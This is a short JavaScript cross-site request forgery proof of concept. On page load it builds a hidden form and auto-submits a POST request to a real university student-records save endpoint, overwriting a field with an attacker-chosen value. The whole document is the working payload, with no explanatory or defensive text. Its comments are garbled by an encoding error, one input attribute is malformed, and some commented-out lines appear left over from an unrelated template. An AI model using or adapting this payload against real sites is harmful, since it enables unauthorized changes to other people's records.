function forge_post()
{
var fields;
fields += "<input type'hidden' name='ywxm' value='zhujianqi'>";
//fields += "<input type='hidden' name='briefdescription' value='POLAND'>";
//fields += "<input type='hidden' name='accesslevel[briefdescription]'value='2'>"; 
//fields += "<input type='hidden' name='guid' value='42'>";
// ����һ����Ԫ��
var p = document.createElement("form");
// ������
p.action = "http://bkjws.sdu.edu.cn/b/grxx/xs/xjxx/save";
p.innerHTML = fields;
p.method = "post";
// �������ӵ���ǰҳ�档
document.body.appendChild(p);
// �ύ��
p.submit();
}
// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post(); }
